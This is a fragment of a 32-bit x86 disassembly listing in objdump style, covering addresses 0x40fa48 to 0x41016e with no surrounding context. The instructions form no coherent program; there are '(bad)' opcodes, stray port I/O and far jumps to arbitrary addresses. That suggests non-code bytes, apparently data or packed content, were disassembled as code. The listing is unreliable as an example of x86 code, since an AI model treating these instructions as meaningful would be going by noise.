  40fa48:	ja     0x40fa4c
  40fa4a:	rol    DWORD PTR [ebx+ecx*4],0x8c
  40fa4e:	add    al,0x7b
  40fa50:	cdq    
  40fa51:	int    0x59
  40fa53:	mov    dh,0x7f
  40fa55:	xchg   edx,eax
  40fa56:	dec    ebx
  40fa57:	push   ebx
  40fa58:	jo     0x40fa86
  40fa5a:	add    DWORD PTR es:[eax+ebx*8+0x156f32fb],ebx
  40fa62:	out    dx,al
  40fa63:	cld    
  40fa64:	xchg   ebp,eax
  40fa65:	cmp    BYTE PTR [eax+0x193f84d7],dl
  40fa6b:	rcr    BYTE PTR [ebp-0x180ffce3],cl
  40fa71:	loope  0x40fa64
  40fa73:	mov    esp,DWORD PTR ds:0x4b662c74
  40fa79:	adc    al,0xdd
  40fa7b:	pop    esi
  40fa7c:	dec    esp
  40fa7d:	js     0x40fa12
  40fa7f:	stc    
  40fa80:	imul   ebx,DWORD PTR [eax-0x64],0x47
  40fa84:	jg     0x40fa54
  40fa86:	cmp    esp,DWORD PTR [edi]
  40fa88:	jbe    0x40fa60
  40fa8a:	inc    ebp
  40fa8b:	jge    0x40fa30
  40fa8d:	sbb    dh,BYTE PTR [ecx-0x6a]
  40fa90:	cli    
  40fa91:	push   esp
  40fa92:	mov    eax,0xb9f675e3
  40fa98:	jle    0x40fae1
  40fa9a:	jns    0x40fa59
  40fa9c:	sub    esi,DWORD PTR [eax+0x30]
  40fa9f:	in     eax,0x4a
  40faa1:	ret    
  40faa2:	or     dh,BYTE PTR [esi]
  40faa4:	pop    ss
  40faa5:	adc    dl,al
  40faa7:	dec    eax
  40faa8:	das    
  40faa9:	pop    edx
  40faaa:	push   edi
  40faab:	scas   al,BYTE PTR es:[edi]
  40faac:	retf   0xb74f
  40faaf:	jecxz  0x40fb0a
  40fab1:	jno    0x40fa74
  40fab3:	xlat   BYTE PTR ds:[ebx]
  40fab4:	inc    edi
  40fab5:	xchg   BYTE PTR [esp+eax*2],ah
  40fab8:	lock mov cl,al
  40fabb:	jae    0x40fa96
  40fabd:	or     DWORD PTR ds:0xb97d0ac2,esp
  40fac3:	ds push esp
  40fac5:	mov    cl,0x74
  40fac7:	cli    
  40fac8:	mov    al,ds:0xfb2df591
  40facd:	push   ebx
  40face:	and    bh,dl
  40fad0:	shl    dl,0x81
  40fad3:	out    0x77,eax
  40fad5:	cs pop ebx
  40fad7:	sbb    al,0x3
  40fad9:	scas   eax,DWORD PTR es:[edi]
  40fada:	outs   dx,DWORD PTR ds:[esi]
  40fadb:	jne    0x40fb4a
  40fadd:	imul   esp,DWORD PTR [eax+eax*2+0x7e918b20],0x7c71d3c
  40fae8:	push   ss
  40fae9:	push   ebx
  40faea:	adc    al,BYTE PTR [ecx]
  40faec:	xchg   edx,eax
  40faed:	test   ebx,esi
  40faef:	push   cs
  40faf0:	cli    
  40faf1:	imul   esi,eax,0x6d
  40faf4:	add    DWORD PTR [eax-0x62],ecx
  40faf7:	sti    
  40faf8:	jbe    0x40fb0d
  40fafa:	mov    edx,0xcd565369
  40faff:	cwde   
  40fb00:	jecxz  0x40fa99
  40fb02:	xor    DWORD PTR [eax-0x40],0x1a
  40fb06:	fild   QWORD PTR [esi]
  40fb08:	or     BYTE PTR [edi+0x66a35034],ah
  40fb0e:	scas   eax,DWORD PTR es:[edi]
  40fb0f:	dec    edx
  40fb10:	push   0xff8cbec8
  40fb15:	std    
  40fb16:	aaa    
  40fb17:	mov    eax,ds:0x5b9aba5
  40fb1c:	jne    0x40faed
  40fb1e:	sbb    esi,esi
  40fb20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb21:	jae    0x40fb82
  40fb23:	mov    dl,BYTE PTR [edx+0x24848692]
  40fb29:	enter  0xaf19,0x70
  40fb2d:	rcr    DWORD PTR [ebx-0x69d1a38b],cl
  40fb33:	inc    edi
  40fb34:	popa   
  40fb35:	shr    BYTE PTR [eax],1
  40fb37:	push   esi
  40fb38:	fwait
  40fb39:	mov    esp,0x26bf171
  40fb3e:	(bad)  
  40fb3f:	test   eax,0x35ffacf5
  40fb44:	push   es
  40fb45:	pop    ecx
  40fb46:	in     al,0x60
  40fb48:	mov    WORD PTR [edi-0x2e24367b],cs
  40fb4e:	in     al,0x65
  40fb50:	das    
  40fb51:	pop    ebx
  40fb52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb53:	inc    esi
  40fb54:	jp     0x40fafa
  40fb56:	fidiv  WORD PTR [ecx]
  40fb58:	mov    ecx,DWORD PTR [esi-0x306a4141]
  40fb5e:	stos   DWORD PTR es:[edi],eax
  40fb5f:	mov    edi,0x5299493f
  40fb64:	mov    gs,WORD PTR [ebx]
  40fb66:	adc    eax,DWORD PTR [eax]
  40fb68:	add    DWORD PTR [eax+0x44],ebp
  40fb6b:	js     0x40fb16
  40fb6d:	xor    edi,ebx
  40fb6f:	ins    BYTE PTR es:[edi],dx
  40fb70:	xchg   esi,eax
  40fb71:	jp     0x40fb42
  40fb73:	mov    ebp,eax
  40fb75:	stos   BYTE PTR es:[edi],al
  40fb76:	dec    eax
  40fb77:	jl     0x40fb72
  40fb79:	aad    0x37
  40fb7b:	mov    ebp,0x5b4c3c43
  40fb80:	fidivr WORD PTR [edx]
  40fb82:	pop    es
  40fb83:	xchg   edi,eax
  40fb84:	adc    eax,0x3263f004
  40fb89:	xlat   BYTE PTR ds:[ebx]
  40fb8a:	cmp    al,0x3d
  40fb8c:	inc    esp
  40fb8d:	jo     0x40fbb9
  40fb8f:	fwait
  40fb90:	jge    0x40fbe1
  40fb92:	xlat   BYTE PTR ds:[ebx]
  40fb93:	lods   eax,DWORD PTR ds:[esi]
  40fb94:	sub    eax,0x199040f1
  40fb99:	sub    al,0x53
  40fb9b:	mov    edx,0x1c8413af
  40fba0:	add    eax,0xa1f03fd3
  40fba5:	xlat   BYTE PTR ds:[ebx]
  40fba6:	aaa    
  40fba7:	(bad)  
  40fba8:	test   DWORD PTR [ecx-0x2afef7b4],0x45413a8f
  40fbb2:	xchg   ecx,eax
  40fbb3:	xchg   ch,bh
  40fbb5:	dec    esi
  40fbb6:	in     eax,0xa4
  40fbb8:	dec    esi
  40fbb9:	sar    DWORD PTR [esi],0x54
  40fbbc:	jmp    0x515b86d3
  40fbc1:	scas   eax,DWORD PTR es:[edi]
  40fbc2:	out    dx,al
  40fbc3:	cmp    eax,0xb6fd30ff
  40fbc8:	mov    esp,0x926df0
  40fbcd:	ret    0xad77
  40fbd0:	loop   0x40fc4e
  40fbd2:	xor    al,0xa9
  40fbd4:	mov    DWORD PTR [esi],0xd78dc5b
  40fbda:	outs   dx,BYTE PTR ds:[esi]
  40fbdb:	es stos BYTE PTR es:[edi],al
  40fbdd:	ds cmp al,0x67
  40fbe0:	mov    edx,0x61032fe2
  40fbe5:	add    DWORD PTR [edx],0x3b
  40fbe8:	mov    ebp,ecx
  40fbea:	and    BYTE PTR [ebx],ah
  40fbec:	add    dh,dl
  40fbee:	retf   
  40fbef:	ror    DWORD PTR [ecx+edi*4],0x6e
  40fbf3:	sub    dl,0x1c
  40fbf6:	sahf   
  40fbf7:	je     0x40fb80
  40fbf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbfa:	sti    
  40fbfb:	das    
  40fbfc:	inc    eax
  40fbfd:	mov    bh,0x4
  40fbff:	adc    DWORD PTR [edx],edx
  40fc01:	sub    cl,ch
  40fc03:	test   DWORD PTR [esi],esi
  40fc05:	add    BYTE PTR [ecx+0x5c192b56],0x72
  40fc0c:	xchg   ebp,eax
  40fc0d:	mov    eax,0x554e57d
  40fc12:	daa    
  40fc13:	push   ds
  40fc14:	mov    esi,0xc9f42883
  40fc19:	cli    
  40fc1a:	loop   0x40fc8e
  40fc1c:	xchg   esi,eax
  40fc1d:	dec    eax
  40fc1e:	jno    0x40fbfb
  40fc20:	sub    BYTE PTR [edi+edx*4],0xb1
  40fc24:	pop    esi
  40fc25:	rcr    DWORD PTR [ebp-0x34871c73],cl
  40fc2b:	mov    ah,0xee
  40fc2d:	xlat   BYTE PTR ds:[ebx]
  40fc2e:	and    DWORD PTR [esi],ebx
  40fc30:	fidiv  DWORD PTR [eax]
  40fc32:	lock push 0x24fa8af4
  40fc38:	popf   
  40fc39:	ror    BYTE PTR [ebp+0x7fdafd43],0x13
  40fc40:	(bad)  
  40fc41:	xchg   ecx,eax
  40fc42:	retf   
  40fc43:	arpl   WORD PTR [ebx-0x46ca155f],sp
  40fc49:	popf   
  40fc4a:	les    ebx,FWORD PTR [edx-0x52ddc4e4]
  40fc50:	xchg   edx,eax
  40fc51:	js     0x40fc27
  40fc53:	bound  esp,QWORD PTR [esi-0x2c]
  40fc56:	fldcw  WORD PTR [ecx+0x5]
  40fc59:	jp     0x40fc0b
  40fc5b:	pop    edi
  40fc5c:	or     DWORD PTR [ebx],ebx
  40fc5e:	lahf   
  40fc5f:	jecxz  0x40fc79
  40fc61:	cmp    cl,BYTE PTR [esi-0x6]
  40fc64:	adc    al,0x39
  40fc66:	cmp    DWORD PTR [ebx+0x6b],eax
  40fc69:	xchg   ecx,eax
  40fc6a:	xor    esp,DWORD PTR [ecx]
  40fc6c:	xlat   BYTE PTR ds:[ebx]
  40fc6d:	and    al,0xb7
  40fc6f:	cs sti 
  40fc71:	push   ecx
  40fc72:	sbb    BYTE PTR [ebp+0x4c],dh
  40fc75:	in     al,0x11
  40fc77:	mov    dl,0x5d
  40fc79:	jmp    0x40fc84
  40fc7b:	lock xor eax,0x10a3a895
  40fc81:	stos   DWORD PTR es:[edi],eax
  40fc82:	dec    eax
  40fc83:	mov    ds:0x2b6153e6,eax
  40fc88:	cdq    
  40fc89:	push   ds
  40fc8a:	hlt    
  40fc8b:	ds pop es
  40fc8d:	mov    ebp,0x9c648e1d
  40fc92:	mov    BYTE PTR [ecx+esi*2],dl
  40fc95:	jl     0x40fd0d
  40fc97:	shr    ebp,0x85
  40fc9a:	mov    dl,0x4b
  40fc9c:	lods   eax,DWORD PTR ds:[esi]
  40fc9d:	pop    ebx
  40fc9e:	inc    edi
  40fc9f:	inc    esp
  40fca0:	loop   0x40fcc6
  40fca2:	and    ebp,esp
  40fca4:	mov    al,0xa4
  40fca6:	mov    eax,0x79f2d2fe
  40fcab:	jbe    0x40fcde
  40fcad:	mov    esp,0xd8227d59
  40fcb2:	out    dx,eax
  40fcb3:	pop    edi
  40fcb4:	dec    edi
  40fcb5:	jp     0x40fcbc
  40fcb7:	into   
  40fcb8:	in     eax,0x1d
  40fcba:	push   ebx
  40fcbb:	cs cmp al,dh
  40fcbe:	cwde   
  40fcbf:	mov    ?,ebx
  40fcc1:	xor    BYTE PTR [esi+0x54],0xfc
  40fcc5:	cmp    DWORD PTR [edx+ecx*2+0x451c9ab3],ebp
  40fccc:	mov    ds:0x597406cf,al
  40fcd1:	loop   0x40fcc6
  40fcd3:	(bad)  
  40fcd4:	pop    esp
  40fcd5:	jle    0x40fd24
  40fcd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcd8:	test   BYTE PTR [ebx],ah
  40fcda:	sub    al,0x76
  40fcdc:	and    esi,DWORD PTR [ecx+edi*4]
  40fcdf:	in     eax,dx
  40fce0:	xor    BYTE PTR [edx],bh
  40fce2:	mov    dl,0xb7
  40fce4:	fstp   DWORD PTR [ebp-0x2d184dd]
  40fcea:	xor    al,0xdb
  40fcec:	in     al,dx
  40fced:	inc    edi
  40fcee:	mov    ah,0xc6
  40fcf0:	xlat   BYTE PTR ds:[ebx]
  40fcf1:	js     0x40fcbd
  40fcf3:	popa   
  40fcf4:	stos   DWORD PTR es:[edi],eax
  40fcf5:	dec    edi
  40fcf6:	jl     0x40fcd1
  40fcf8:	inc    ebp
  40fcf9:	push   ecx
  40fcfa:	jnp    0x40fc92
  40fcfc:	out    dx,al
  40fcfd:	adc    al,0xea
  40fcff:	js     0x40fcff
  40fd01:	mov    WORD PTR [eax-0x6d],?
  40fd04:	adc    edi,0x50c3bb42
  40fd0a:	push   ds
  40fd0b:	xchg   ecx,eax
  40fd0c:	stc    
  40fd0d:	add    DWORD PTR [ebx-0x16],0x938289ba
  40fd14:	cs or  edi,esp
  40fd17:	retf   
  40fd18:	loopne 0x40fd79
  40fd1a:	add    BYTE PTR [edi+0x10],dh
  40fd1d:	jnp    0x40fcd1
  40fd1f:	ins    DWORD PTR es:[edi],dx
  40fd20:	xchg   ecx,ebp
  40fd22:	and    bh,cl
  40fd24:	outs   dx,DWORD PTR ds:[esi]
  40fd25:	ss retf 
  40fd27:	dec    eax
  40fd28:	out    0x7d,eax
  40fd2a:	mov    eax,ds:0xe7c66aa6
  40fd2f:	cld    
  40fd30:	lahf   
  40fd31:	adc    BYTE PTR [eax-0x5c],bh
  40fd34:	inc    edx
  40fd35:	(bad)  
  40fd36:	sub    ecx,DWORD PTR cs:[ebx+0x219f97e1]
  40fd3d:	mov    ds,ebp
  40fd3f:	test   BYTE PTR [edx+0x66],ch
  40fd42:	out    dx,al
  40fd43:	leave  
  40fd44:	in     al,dx
  40fd45:	shl    al,cl
  40fd47:	mov    al,ds:0x8d2079f6
  40fd4c:	rcr    DWORD PTR [eax+edx*4-0x69],0x69
  40fd51:	scas   al,BYTE PTR es:[edi]
  40fd52:	xor    al,0x1c
  40fd54:	ret    
  40fd55:	repnz or bh,dl
  40fd58:	xor    BYTE PTR [ebx+ebp*8],bl
  40fd5b:	retf   0x872e
  40fd5e:	add    al,BYTE PTR [edi]
  40fd60:	sub    DWORD PTR [edi+eax*1-0x1a],eax
  40fd64:	cmp    eax,0xf56828d1
  40fd69:	arpl   WORD PTR [edi+eiz*8],ax
  40fd6c:	test   eax,0x30be1657
  40fd71:	xchg   ebp,eax
  40fd72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd73:	int3   
  40fd74:	dec    edi
  40fd75:	in     eax,dx
  40fd76:	cs push ecx
  40fd78:	cmp    al,0x80
  40fd7a:	lahf   
  40fd7b:	or     al,0x9b
  40fd7d:	sub    bh,bh
  40fd7f:	pop    ecx
  40fd80:	jno    0x40fd2a
  40fd82:	adc    eax,0x9d788e74
  40fd87:	pop    ss
  40fd88:	test   bh,bl
  40fd8a:	jge    0x40fdf1
  40fd8c:	retf   
  40fd8d:	cli    
  40fd8e:	cmp    dh,BYTE PTR [esi+0x6f]
  40fd91:	jo     0x40fdd2
  40fd93:	clc    
  40fd94:	or     BYTE PTR [esi+eiz*4],al
  40fd97:	ficom  WORD PTR [esi]
  40fd99:	stc    
  40fd9a:	aad    0x3d
  40fd9c:	lea    esi,[ebx-0x57313050]
  40fda2:	loope  0x40fdd8
  40fda4:	sahf   
  40fda5:	cdq    
  40fda6:	add    eax,esi
  40fda8:	lods   al,BYTE PTR ds:[esi]
  40fda9:	cmp    DWORD PTR [edi+eiz*1],edi
  40fdac:	mov    ebp,0x1716bf44
  40fdb1:	sti    
  40fdb2:	fdiv   st,st(7)
  40fdb4:	cwde   
  40fdb5:	loopne 0x40fd46
  40fdb7:	test   BYTE PTR [ecx+ebx*8-0x3d],al
  40fdbb:	popf   
  40fdbc:	mov    fs,esi
  40fdbe:	int    0x59
  40fdc0:	cmp    BYTE PTR [edi],0x67
  40fdc3:	stc    
  40fdc4:	or     esp,esi
  40fdc6:	mov    al,0xec
  40fdc8:	out    0x70,al
  40fdca:	test   DWORD PTR [edx],edi
  40fdcc:	adc    al,0x1c
  40fdce:	(bad)
  40fdd2:	pop    ss
  40fdd3:	adc    eax,0x85c66fb1
  40fdd8:	push   edx
  40fdd9:	fldenv [ecx]
  40fddb:	jno    0x40fe2a
  40fddd:	inc    eax
  40fdde:	dec    eax
  40fddf:	xchg   ebx,eax
  40fde0:	fwait
  40fde1:	ja     0x40fd88
  40fde3:	cwde   
  40fde4:	mov    DWORD PTR [ebx-0x138ed423],ebx
  40fdea:	cli    
  40fdeb:	loopne 0x40fd6f
  40fded:	std    
  40fdee:	clc    
  40fdef:	mov    eax,ds:0xb111f94d
  40fdf4:	inc    esp
  40fdf5:	mov    ebx,0xdbaa9c64
  40fdfa:	jle    0x40fdc7
  40fdfc:	(bad)  
  40fdfd:	mov    eax,ds:0xfa7c7f28
  40fe02:	or     al,0xf3
  40fe04:	mov    ch,0x1
  40fe06:	and    esi,edx
  40fe08:	shr    BYTE PTR [ebx+0xb78a28e],1
  40fe0e:	data16 or BYTE PTR [eax],bh
  40fe11:	out    0xdc,eax
  40fe13:	and    eax,0xb50f6e9a
  40fe18:	jecxz  0x40fdc9
  40fe1a:	push   eax
  40fe1b:	sti    
  40fe1c:	icebp  
  40fe1d:	cwde   
  40fe1e:	out    dx,al
  40fe1f:	push   0x311b6f0b
  40fe24:	lock push es
  40fe26:	out    0x37,al
  40fe28:	test   eax,0x8cfd58ff
  40fe2d:	lahf   
  40fe2e:	mov    dl,0x4d
  40fe30:	add    BYTE PTR [esi+0x3a],0xb6
  40fe34:	clc    
  40fe35:	imul   edx,DWORD PTR [ebp+ebp*1-0x28],0x39
  40fe3a:	shl    ecx,0x72
  40fe3d:	or     BYTE PTR [edi-0x6c],cl
  40fe40:	inc    ebx
  40fe41:	mov    ds:0x34d80a7c,al
  40fe46:	into   
  40fe47:	mov    bl,0x39
  40fe49:	stos   DWORD PTR es:[edi],eax
  40fe4a:	sbb    BYTE PTR [edi-0x6f932932],ch
  40fe50:	xorps  xmm5,xmm0
  40fe53:	ret    
  40fe54:	aas    
  40fe55:	dec    ebp
  40fe56:	xchg   edi,eax
  40fe57:	mov    ds:0x7ef8035a,al
  40fe5c:	inc    ebp
  40fe5d:	xchg   edx,eax
  40fe5e:	es xor al,0x80
  40fe61:	or     eax,0x7ceb0bb0
  40fe66:	cwde   
  40fe67:	cmp    bh,BYTE PTR [edx-0x7a464778]
  40fe6d:	popf   
  40fe6e:	push   ds
  40fe6f:	shl    DWORD PTR [esp+edx*4],0x3a
  40fe73:	sub    cl,BYTE PTR [ebp-0x2724b474]
  40fe79:	(bad)  
  40fe7a:	cmp    ch,BYTE PTR [eax-0x20d30ce6]
  40fe80:	aam    0xd7
  40fe82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe83:	sbb    ebx,DWORD PTR [ebx-0x47]
  40fe86:	mov    BYTE PTR [ebp+0x0],bh
  40fe89:	gs scas al,BYTE PTR es:[edi]
  40fe8b:	mov    ebp,0x21a8da00
  40fe90:	sub    BYTE PTR ds:0x6b4bafcf,0xe7
  40fe97:	xchg   esi,eax
  40fe98:	mov    al,ds:0xd5c5117f
  40fe9d:	call   0xe86e:0x33e20409
  40fea4:	and    eax,esi
  40fea6:	xchg   ecx,eax
  40fea7:	call   0xa7f8:0x18fb61ba
  40feae:	mov    eax,ds:0x7bedd96a
  40feb3:	mov    eax,ds:0x68c6d539
  40feb8:	push   ss
  40feb9:	xchg   DWORD PTR [esi+eiz*4-0x62],eax
  40febd:	test   dh,0xa1
  40fec0:	outs   dx,DWORD PTR ds:[esi]
  40fec1:	cmp    al,0x52
  40fec3:	push   ebp
  40fec4:	repnz xor al,0xae
  40fec7:	scas   eax,DWORD PTR es:[edi]
  40fec8:	aas    
  40fec9:	add    ebx,DWORD PTR [ecx-0x1c]
  40fecc:	addr16 pop ecx
  40fece:	xchg   BYTE PTR [edx],al
  40fed0:	and    edi,DWORD PTR [ebx-0x7]
  40fed3:	pop    esi
  40fed4:	push   ss
  40fed5:	jno    0x40fe72
  40fed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed8:	pop    eax
  40fed9:	jg     0x40feec
  40fedb:	jle    0x40ff3f
  40fedd:	cmp    bh,ah
  40fedf:	shr    DWORD PTR [ebp-0x4952b284],0x2
  40fee6:	mov    gs,WORD PTR [edi+0x2b]
  40fee9:	rcl    edx,0x11
  40feec:	test   eax,0xb23c965e
  40fef1:	out    dx,al
  40fef2:	cld    
  40fef3:	les    edx,FWORD PTR [ebx+0x378a06b6]
  40fef9:	xor    esp,DWORD PTR [esi+0x1b]
  40fefc:	aad    0x52
  40fefe:	add    DWORD PTR [ecx],ecx
  40ff00:	push   edx
  40ff01:	add    al,0x23
  40ff03:	scas   al,BYTE PTR es:[edi]
  40ff04:	int3   
  40ff05:	fldcw  WORD PTR [edi+0x4b6e5af2]
  40ff0b:	or     al,0x1a
  40ff0d:	stc    
  40ff0e:	mov    esp,0x100b577f
  40ff13:	stc    
  40ff14:	int3   
  40ff15:	pop    edx
  40ff16:	or     al,0x36
  40ff18:	mov    ah,BYTE PTR ds:0xb2ac0572
  40ff1e:	xor    DWORD PTR [edx],0xffffffe1
  40ff21:	js     0x40feb2
  40ff23:	in     eax,0xf4
  40ff25:	inc    ebx
  40ff26:	mov    bh,0x2e
  40ff28:	pop    ebx
  40ff29:	sub    eax,0x4c16008d
  40ff2e:	dec    ecx
  40ff2f:	imul   ebp,DWORD PTR [ecx],0xc91d76b
  40ff35:	fld    QWORD PTR cs:[edi-0x5161cf69]
  40ff3c:	xchg   edx,eax
  40ff3d:	ds pushf 
  40ff3f:	repnz push ebp
  40ff41:	add    cl,0x86
  40ff44:	dec    esp
  40ff45:	sbb    al,BYTE PTR [ebp+0x6d2b8282]
  40ff4b:	mov    esi,0xeaf2cba8
  40ff50:	cwde   
  40ff51:	xchg   DWORD PTR [esi-0x3b],ebp
  40ff54:	ret    
  40ff55:	pop    esp
  40ff56:	dec    ecx
  40ff57:	stos   BYTE PTR es:[edi],al
  40ff58:	stc    
  40ff59:	jns    0x40ff0e
  40ff5b:	xor    cl,BYTE PTR [esi-0x35]
  40ff5e:	and    eax,0x34418212
  40ff63:	mov    bh,0x72
  40ff65:	repz leave 
  40ff67:	mov    ebx,esi
  40ff69:	xchg   esi,eax
  40ff6a:	gs dec esp
  40ff6c:	cmc    
  40ff6d:	push   ebx
  40ff6e:	xor    esp,ecx
  40ff70:	cs xor bl,dh
  40ff73:	cmp    DWORD PTR [esi+ebx*8+0x44eab7f3],ecx
  40ff7a:	test   al,0x3
  40ff7c:	adc    ch,dl
  40ff7e:	fs fs dec esp
  40ff81:	in     al,dx
  40ff82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff84:	or     eax,DWORD PTR [ebx+edx*2-0x43]
  40ff88:	cmp    ebp,DWORD PTR [esi]
  40ff8a:	cmp    eax,0xe64f12aa
  40ff8f:	dec    edi
  40ff90:	das    
  40ff91:	jmp    0x94dd1aa3
  40ff96:	ret    0x461b
  40ff99:	pop    es
  40ff9a:	sbb    al,0xe7
  40ff9c:	popa   
  40ff9d:	cmp    eax,0xf0f822c0
  40ffa2:	mov    dl,0x61
  40ffa4:	push   es
  40ffa5:	dec    DWORD PTR [edi-0x1bc79142]
  40ffab:	cld    
  40ffac:	xor    eax,0x8b5b4f1a
  40ffb1:	fcom   DWORD PTR [eax+0x33c2a54f]
  40ffb7:	leave  
  40ffb8:	sbb    edx,DWORD PTR [edi+eax*2-0x1254369c]
  40ffbf:	adc    al,BYTE PTR [ecx]
  40ffc1:	icebp  
  40ffc2:	xchg   ecx,eax
  40ffc3:	push   ss
  40ffc4:	dec    esi
  40ffc5:	xor    edx,ebx
  40ffc7:	rcr    BYTE PTR [eax+0x16],cl
  40ffca:	mov    eax,0xc390c728
  40ffcf:	sub    DWORD PTR [ebp-0x7d],edx
  40ffd2:	inc    ebp
  40ffd3:	or     bl,BYTE PTR [edi-0x70]
  40ffd6:	xchg   ebp,eax
  40ffd7:	rcl    DWORD PTR [ecx-0x6aecb80a],1
  40ffdd:	stc    
  40ffde:	cdq    
  40ffdf:	fst    st(6)
  40ffe1:	cs pop edx
  40ffe3:	fmulp  st(2),st
  40ffe5:	jae    0x410012
  40ffe7:	mov    ch,0x9d
  40ffe9:	fdiv   QWORD PTR [esi-0x15]
  40ffec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffed:	jb     0x40ff94
  40ffef:	iret   
  40fff0:	pop    ss
  40fff1:	or     si,bx
  40fff4:	out    dx,al
  40fff5:	(bad)  
  40fff6:	xor    BYTE PTR [eax],al
  40fff8:	xchg   DWORD PTR [eax+ebx*2+0x41a3a4fb],ebx
  40ffff:	sub    DWORD PTR [ecx+0x5527ad2f],0xffffffff
  410006:	loop   0x40ffc9
  410008:	mov    ds:0xfa0fa6a,eax
  41000d:	mov    ?,WORD PTR [ecx]
  41000f:	ins    DWORD PTR es:[edi],dx
  410010:	outs   dx,BYTE PTR ds:[esi]
  410011:	aam    0xca
  410013:	xchg   esp,eax
  410014:	dec    ebp
  410015:	aaa    
  410016:	xchg   ecx,eax
  410017:	sbb    BYTE PTR [ebx],0x76
  41001a:	jno    0x41004f
  41001c:	dec    ebx
  41001d:	jmp    0x40ffb8
  41001f:	pop    ecx
  410020:	cld    
  410021:	in     eax,0x18
  410023:	mov    DWORD PTR [ebx+eiz*1+0x25dd1fba],ecx
  41002a:	stos   DWORD PTR es:[edi],eax
  41002b:	mov    ch,0xf6
  41002d:	(bad)  
  41002e:	leave  
  41002f:	aad    0x59
  410031:	pop    es
  410032:	stos   DWORD PTR es:[edi],eax
  410033:	jmp    0x410071
  410035:	lock in al,0x49
  410038:	xchg   ebx,eax
  410039:	or     al,0x2d
  41003b:	loope  0x410017
  41003d:	in     al,dx
  41003e:	js     0x410014
  410040:	cli    
  410041:	out    0x5f,eax
  410043:	jmp    0x67cf:0xfd4a0b03
  41004a:	add    al,0x10
  41004c:	lea    ebp,[edx+0x765bd101]
  410052:	fwait
  410053:	sbb    BYTE PTR [ecx],cl
  410055:	stos   BYTE PTR es:[edi],al
  410056:	pop    esp
  410057:	popa   
  410058:	es js  0x410063
  41005b:	cmp    BYTE PTR [ebx-0x36c3d86],ah
  410061:	jge    0x410087
  410063:	lods   eax,DWORD PTR ds:[esi]
  410064:	pop    ebx
  410065:	mov    eax,ds:0x87eea3aa
  41006a:	sbb    al,0xd8
  41006c:	cdq    
  41006d:	push   0xffffffb0
  41006f:	jmp    0xee21156
  410074:	ficom  WORD PTR [edi-0x78fba752]
  41007a:	in     al,0x52
  41007c:	test   DWORD PTR [ebp+ebx*8+0x7c],esp
  410080:	inc    esp
  410081:	fdiv   DWORD PTR [ebx+0x40]
  410084:	(bad)  
  410085:	pop    edx
  410086:	or     BYTE PTR [edi],bl
  410088:	rcr    BYTE PTR [ecx],1
  41008a:	fistp  QWORD PTR [esi+ecx*2-0x1a]
  41008e:	cli    
  41008f:	sub    ah,BYTE PTR [edx-0x1d4743e2]
  410095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410096:	xchg   edx,eax
  410097:	push   ds
  410098:	jecxz  0x410034
  41009a:	add    esp,DWORD PTR [eax-0x7b]
  41009d:	pop    esp
  41009e:	clc    
  41009f:	(bad)  
  4100a0:	cmp    BYTE PTR [ecx+0x2d],ah
  4100a3:	add    al,0xe6
  4100a5:	inc    ebx
  4100a6:	scas   al,BYTE PTR es:[edi]
  4100a7:	or     ebx,DWORD PTR ds:0xf6a62aa5
  4100ad:	out    dx,eax
  4100ae:	add    BYTE PTR [ebx],dl
  4100b0:	mov    fs,esp
  4100b2:	aam    0x69
  4100b4:	sbb    DWORD PTR [ecx-0x16],esi
  4100b7:	retf   
  4100b8:	not    DWORD PTR [eax]
  4100ba:	mov    ebx,0xc9001e60
  4100bf:	in     al,0x73
  4100c1:	cmc    
  4100c2:	loope  0x4100ff
  4100c4:	(bad)
  4100c7:	leave  
  4100c8:	ret    
  4100c9:	hlt    
  4100ca:	cmp    dl,bh
  4100cc:	shl    ch,1
  4100ce:	out    0x1,eax
  4100d0:	adc    BYTE PTR [ebx],cl
  4100d2:	nop
  4100d3:	retf   0x5462
  4100d6:	popa   
  4100d7:	ins    DWORD PTR es:[edi],dx
  4100d8:	sub    edx,0xffffffdf
  4100db:	push   0x5f201f3c
  4100e0:	ja     0x410120
  4100e2:	repnz push esi
  4100e4:	bound  ebx,QWORD PTR [esi+0x4e0b0dc2]
  4100ea:	dec    esp
  4100eb:	jmp    0x410136
  4100ed:	push   cs
  4100ee:	repnz lock icebp 
  4100f1:	ss mov cl,0x89
  4100f4:	mov    ebx,0x16065f9e
  4100f9:	lock push 0xffffffa1
  4100fc:	push   ecx
  4100fd:	das    
  4100fe:	ret    0x61c3
  410101:	fdiv   DWORD PTR [ecx+0x44]
  410104:	es clc 
  410106:	mov    dl,0x99
  410108:	inc    edx
  410109:	inc    esp
  41010a:	pop    ebp
  41010b:	jle    0x410130
  41010d:	xlat   BYTE PTR ds:[ebx]
  41010e:	stos   DWORD PTR es:[edi],eax
  41010f:	xor    bl,0x68
  410112:	popf   
  410113:	pop    esp
  410114:	adc    BYTE PTR [ecx],0x79
  410117:	adc    eax,DWORD PTR ds:[eax]
  41011a:	jmp    0x68b6:0x698233ba
  410121:	add    ebx,eax
  410123:	and    DWORD PTR ds:0x9f360d94,edx
  410129:	mov    ebx,0xdb437811
  41012e:	mov    al,ds:0x5122dd86
  410133:	sub    al,0x16
  410135:	mov    WORD PTR [edx+0x7e],?
  410138:	cmp    bl,BYTE PTR [esi]
  41013a:	push   eax
  41013b:	mov    eax,ds:0xba20f994
  410140:	mov    ebp,0x1ed41d30
  410145:	mov    cl,0x7b
  410147:	test   al,0xe9
  410149:	fbld   TBYTE PTR ds:0x648bda03
  41014f:	mov    WORD PTR [ebx+0x5734d9a6],?
  410155:	pop    eax
  410156:	jmp    0x410132
  410158:	pop    esp
  410159:	jno    0x41013f
  41015b:	or     al,bh
  41015d:	push   ebx
  41015e:	xchg   BYTE PTR [edx-0x89087d5],dh
  410164:	push   ebx
  410165:	mov    BYTE PTR [esi+0x65c7cacd],0xbe
  41016c:	lods   eax,DWORD PTR ds:[esi]
  41016d:	push   ds
  41016e:	std    
